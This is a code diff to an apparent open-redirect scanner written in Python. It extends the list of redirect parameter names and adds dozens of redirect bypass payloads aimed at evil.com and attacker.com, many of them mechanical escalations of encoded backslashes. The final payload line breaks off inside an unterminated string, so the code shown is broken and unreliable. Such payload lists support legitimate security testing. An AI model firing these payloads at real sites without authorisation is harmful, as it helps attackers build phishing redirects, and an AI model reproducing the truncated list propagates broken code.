@@ -26,12 +26,24 @@ USER_AGENTS = [
 ]
 
 # Common redirect parameters developers use
-COMMON_REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnTo", "destination", "goto", "forward", "continue"]
+COMMON_REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnTo", "destination", "goto", "forward", "continue",
+    "redir", "path", "uri", "out", "view", "file", "ref", "site", "u", "image_url", "go", "return_url"]
 
 # Common payloads for open redirect testing with different variations
 PAYLOADS = [
-    "http://evil.com", "https://attacker.com", "//evil.com", "//google.com", "//127.0.0.1", "//localhost",
-    "\\evil.com", "%2Fevil.com", "%2F%2Fevil.com", "%5C%5Cevil.com", "@evil.com", "//\\evil.com"
+     "http://evil.com", "https://attacker.com", "//evil.com", "//google.com", "//127.0.0.1", "//localhost",
+    "\\evil.com", "%2Fevil.com", "%2F%2Fevil.com", "%5C%5Cevil.com", "@evil.com", "//\\evil.com",
+    "/evil.com", "/\\evil.com", "/%09/evil.com", "/%5c%2fevil.com", "/%5c%5c/evil.com", "/%5c%5c/evil.com/%23",
+    "///evil.com", "////evil.com", "/%2f%2f/evil.com", "/%2f%2f/evil.com/%23", "///attacker.com/%2f%2f",
+    "///attacker.com/%2f%2f%2f", "///attacker.com/%5c%5c", "///attacker.com/%5c%5c%5c", "///attacker.com/%5c%5c%5c%5c",
+    "///attacker.com/%5c%5c%5c%5c%5c", "///attacker.com/%5c%5c%5c%5c%5c%5c", "///attacker.com/%5c%5c%5c%5c%5c%5c%5c",
+    "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c", "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c", "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c",
+    "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c", "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c",
+    "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c", "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c",
+    "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c", "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c",
+    "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c", "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c",
+    "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c", "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c",
+    "///attacker.com/%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c%5c", "///attacker.com/%5c%5c%5c%5c%5c%
 ]
 
 # Function to setup Selenium headless browser
